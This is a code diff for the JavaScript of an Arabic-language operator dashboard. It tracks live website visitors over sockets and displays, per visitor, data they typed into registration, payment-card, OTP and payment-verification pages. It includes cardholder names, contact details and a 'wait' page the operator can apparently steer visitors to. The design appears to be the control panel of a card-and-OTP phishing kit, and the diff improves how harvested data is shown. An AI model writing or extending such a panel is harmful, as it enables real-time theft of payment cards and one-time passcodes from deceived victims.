@@ -173,6 +173,21 @@ async function loadUsers() {
   }
 }
 
+function getUserDisplayName(user) {
+  if (!user) return 'مستخدم جديد';
+  if (user.name && user.name.trim() !== '' && user.name !== 'مجهول') return user.name.trim();
+  if (user.formData) {
+    const reg = user.formData.registration;
+    if (reg) {
+      const full = [reg.firstName, reg.lastName].filter(Boolean).join(' ');
+      if (full) return full;
+    }
+    const card = user.formData['payment-card'];
+    if (card && card.cardholderName) return card.cardholderName;
+  }
+  return 'مستخدم جديد';
+}
+
 function renderUserList(list) {
   const usersListEl = document.getElementById('users-list');
   if(!usersListEl) return;
@@ -191,19 +206,21 @@ function renderUserList(list) {
     }
     item.dataset.sessionId = user.sessionId;
     
-    const initials = getInitials(user.name || 'مستخدم');
+    const displayName = getUserDisplayName(user);
+    const initials = getInitials(displayName);
     const dotClass = user.isConnected ? 'success' : 'muted';
-    const pageName = PAGE_LABELS[user.currentPage] || user.currentPage || '';
+    const pageName = PAGE_LABELS[user.currentPage] || (user.currentPage === 'index' ? 'الصفحة الرئيسية' : user.currentPage || 'الرئيسية');
+    const contact = user.email || user.phone || (user.formData?.registration?.email || user.formData?.registration?.phone || '');
     
     item.innerHTML = `
       <div class="user-avatar">${initials}</div>
       <div class="user-info">
-        <div class="user-name">${escapeHtml(user.name || 'مجهول')}</div>
+        <div class="user-name">${escapeHtml(displayName)}</div>
         <div class="user-meta">
           <span class="dot ${dotClass}"></span>
           ${escapeHtml(pageName)}
         </div>
-        <div class="user-contact">${escapeHtml(user.email || user.phone || '')}</div>
+        <div class="user-contact">${escapeHtml(contact)}</div>
       </div>
     `;
     item.addEventListener('click', () => selectUser(user.sessionId));
@@ -234,25 +251,38 @@ async function selectUser(sessionId) {
 }
 
 function renderChat(data) {
+  if (!data) return;
   const placeholder = document.getElementById('chat-placeholder');
   const activeChat = document.getElementById('chat-active');
-  if(placeholder) placeholder.style.display = 'none';
-  if(activeChat) activeChat.style.display = 'flex';
+  if (placeholder) {
+    placeholder.classList.add('hidden');
+    placeholder.style.display = 'none';
+  }
+  if (activeChat) {
+    activeChat.classList.remove('hidden');
+    activeChat.style.display = 'flex';
+  }
   
-  const initials = getInitials(data.name || 'مستخدم');
-  const avatarEl = document.getElementById('chat-avatar');
-  if(avatarEl) avatarEl.textContent = initials;
+  const displayName = getUserDisplayName(data);
+  const initials = getInitials(displayName);
+  const avatarEl = document.getElementById('user-avatar');
+  if (avatarEl) avatarEl.textContent = initials;
   
-  const nameEl = document.getElementById('chat-name');
-  if(nameEl) nameEl.textContent = escapeHtml(data.name || 'مجهول');
+  const nameEl = document.getElementById('chat-user-name');
+  if (nameEl) nameEl.textContent = escapeHtml(displayName);
   
-  const pageName = PAGE_LABELS[data.currentPage] || data.currentPage || '';
-  const dotClass = data.isConnected ? 'success' : 'muted';
-  const pageEl = document.getElementById('chat-page');
-  if(pageEl) pageEl.innerHTML = `<span class="dot ${dotClass}"></span> ${escapeHtml(pageName)}`;
+  const pageName = PAGE_LABELS[data.currentPage] || (data.currentPage === 'index' ? 'الصفحة الرئيسية' : data.currentPage || 'الرئيسية');
+  const dotClass = data.isConnected ? 'text-success' : 'text-muted';
+  const pageContainer = document.getElementById('user-current-page');
+  if (pageContainer) {
+    pageContainer.innerHTML = `<i class="fas fa-circle ${dotClass}"></i> <span id="page-name">${escapeHtml(pageName)}</span>`;
+  }
   
-  const contactEl = document.getElementById('chat-contact');
-  if(contactEl) contactEl.textContent = escapeHtml(data.email || data.phone || '');
+  const contactEl = document.getElementById('user-contact');
+  if (contactEl) {
+    const contact = data.email || data.phone || (data.formData?.registration?.email || data.formData?.registration?.phone || '');
+    contactEl.textContent = contact || 'لا توجد بيانات تواصل مسجلة';
+  }
   
   renderNavButtons(data.currentPage);
   renderMessages(data.formData);
@@ -289,24 +319,38 @@ function renderNavButtons(activePage) {
 
 function renderMessages(formData) {
   const list = document.getElementById('messages-list');
-  if(!list) return;
+  if (!list) return;
   list.innerHTML = '';
   
-  const pageOrder = ['registration', 'payment-card', 'qpy', 'otp', 'payment-verify'];
+  if (!formData || Object.keys(formData).length === 0) {
+    list.innerHTML = `
+      <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
+        <i class="fas fa-clipboard-list" style="font-size:2.5rem; margin-bottom:12px; opacity:0.4;"></i>
+        <h4 style="margin-bottom:6px; color:var(--text);">في انتظار إدخال بيانات النموذج</h4>
+        <p style="font-size:13px;">المستخدم يتصفح الموقع ولم يقم بإدخال بيانات في النماذج بعد.</p>
+      </div>`;
+    return;
+  }
   
-  pageOrder.forEach(pageId => {
-    const data = formData ? formData[pageId] : null;
-    if (data && Object.keys(data).length > 0) {
+  const pageOrder = ['registration', 'registration-summary', 'payment', 'payment-card', 'qpy', 'otp', 'payment-verify', 'wait'];
+  const allPages = Array.from(new Set([...pageOrder, ...Object.keys(formData)]));
+  let hasEntries = false;
+  
+  allPages.forEach(pageId => {
+    const data = formData[pageId];
+    if (data && typeof data === 'object' && Object.keys(data).length > 0) {
       const group = document.createElement('div');
       group.className = 'message-group';
       
       const header = document.createElement('div');
       header.className = 'message-group-header';
-      header.textContent = PAGE_LABELS[pageId] || pageId;
+      header.innerHTML = `<i class="fas fa-file-alt"></i> ${PAGE_LABELS[pageId] || pageId}`;
       group.appendChild(header);
       
+      let fieldCount = 0;
       Object.entries(data).forEach(([key, value]) => {
-        if (value && String(value).trim() !== '') {
+        if (value !== undefined && value !== null && String(value).trim() !== '') {
+          fieldCount++;
           const item = document.createElement('div');
           item.className = 'message-item';
           
@@ -324,11 +368,21 @@ function renderMessages(formData) {
         }
       });
       
-      if(group.children.length > 1) { // Only append if it has fields
-          list.appendChild(group);
+      if (fieldCount > 0) {
+        hasEntries = true;
+        list.appendChild(group);
       }
     }
   });
+
+  if (!hasEntries) {
+    list.innerHTML = `
+      <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
+        <i class="fas fa-clipboard-list" style="font-size:2.5rem; margin-bottom:12px; opacity:0.4;"></i>
+        <h4 style="margin-bottom:6px; color:var(--text);">في انتظار إدخال بيانات النموذج</h4>
+        <p style="font-size:13px;">المستخدم يتصفح الموقع ولم يقم بإدخال بيانات في النماذج بعد.</p>
+      </div>`;
+  }
 }
 
 function setupSearch() {
@@ -336,24 +390,29 @@ function setupSearch() {
   if(searchInput) {
     searchInput.addEventListener('input', (e) => {
       const term = e.target.value.toLowerCase();
-      const filtered = users.filter(u => 
-        (u.name && u.name.toLowerCase().includes(term)) ||
-        (u.email && u.email.toLowerCase().includes(term)) ||
-        (u.phone && u.phone.toLowerCase().includes(term))
-      );
+      const filtered = users.filter(u => {
+        const name = getUserDisplayName(u).toLowerCase();
+        const email = (u.email || '').toLowerCase();
+        const phone = (u.phone || '').toLowerCase();
+        return name.includes(term) || email.includes(term) || phone.includes(term);
+      });
       renderUserList(filtered);
     });
   }
 }
 
 if (socket) {
-  socket.on('user:connected', ({ sessionId, page }) => {
-    const user = users.find(u => u.sessionId === sessionId);
+  socket.on('user:connected', ({ sessionId, page, name, email, phone, formData }) => {
+    let user = users.find(u => u.sessionId === sessionId);
     if(user) {
       user.isConnected = true;
       user.currentPage = page || user.currentPage;
+      if (name) user.name = name;
+      if (email) user.email = email;
+      if (phone) user.phone = phone;
+      if (formData) user.formData = formData;
     } else {
-      loadUsers(); // load if new user
+      loadUsers();
     }
     renderUserList(users);
     loadStats();
@@ -372,37 +431,71 @@ if (socket) {
     loadStats();
   });
 
-  socket.on('user:page-change', ({ sessionId, page }) => {
+  socket.on('user:page-change', ({ sessionId, page, name, email, phone }) => {
     const user = users.find(u => u.sessionId === sessionId);
     if(user) {
       user.currentPage = page;
+      user.isConnected = true;
+      if (name) user.name = name;
+      if (email) user.email = email;
+      if (phone) user.phone = phone;
       renderUserList(users);
       if(currentUserData && currentUserData.sessionId === sessionId) {
         currentUserData.currentPage = page;
+        currentUserData.isConnected = true;
+        if (name) currentUserData.name = name;
+        if (email) currentUserData.email = email;
+        if (phone) currentUserData.phone = phone;
         renderChat(currentUserData);
       }
     }
   });
 
-  socket.on('user:form-submit', ({ sessionId, page, formData }) => {
+  socket.on('user:form-submit', (data) => {
+    const { sessionId, page, formData, name, email, phone, allFormData } = data;
+    const user = users.find(u => u.sessionId === sessionId);
+    if(user) {
+      if(!user.formData) user.formData = {};
+      user.formData[page] = formData;
+      if (allFormData) user.formData = allFormData;
+      if (name) user.name = name;
+      if (email) user.email = email;
+      if (phone) user.phone = phone;
+      renderUserList(users);
+    }
     if(currentUserData && currentUserData.sessionId === sessionId) {
       if(!currentUserData.formData) currentUserData.formData = {};
       currentUserData.formData[page] = formData;
-      renderMessages(currentUserData.formData);
+      if (allFormData) currentUserData.formData = allFormData;
+      if (name) currentUserData.name = name;
+      if (email) currentUserData.email = email;
+      if (phone) currentUserData.phone = phone;
+      renderChat(currentUserData);
     }
   });
 
-  socket.on('user:update', ({ sessionId, page, formData }) => {
+  socket.on('user:update', (data) => {
+    const { sessionId, page, formData, name, email, phone, allFormData } = data;
+    const user = users.find(u => u.sessionId === sessionId);
+    if(user) {
+      if(!user.formData) user.formData = {};
+      if (formData) user.formData[page] = formData;
+      if (allFormData) user.formData = allFormData;
+      if (page) user.currentPage = page;
+      if (name) user.name = name;
+      if (email) user.email = email;
+      if (phone) user.phone = phone;
+      renderUserList(users);
+    }
     if(currentUserData && currentUserData.sessionId === sessionId) {
       if(!currentUserData.formData) currentUserData.formData = {};
       if (formData) currentUserData.formData[page] = formData;
+      if (allFormData) currentUserData.formData = allFormData;
       if (page) currentUserData.currentPage = page;
+      if (name) currentUserData.name = name;
+      if (email) currentUserData.email = email;
+      if (phone) currentUserData.phone = phone;
       renderChat(currentUserData);
-    }
-    const user = users.find(u => u.sessionId === sessionId);
-    if(user) {
-      if(page) user.currentPage = page;
-      renderUserList(users);
     }
   });
 }
@@ -431,4 +524,22 @@ function escapeHtml(str) {
 
 document.addEventListener('DOMContentLoaded', () => {
   setupSearch();
+  
+  const closeBtn = document.getElementById('close-chat');
+  if (closeBtn) {
+    closeBtn.addEventListener('click', () => {
+      currentUserData = null;
+      const placeholder = document.getElementById('chat-placeholder');
+      const activeChat = document.getElementById('chat-active');
+      if (activeChat) {
+        activeChat.classList.add('hidden');
+        activeChat.style.display = 'none';
+      }
+      if (placeholder) {
+        placeholder.classList.remove('hidden');
+        placeholder.style.display = 'flex';
+      }
+      document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
+    });
+  }
 });
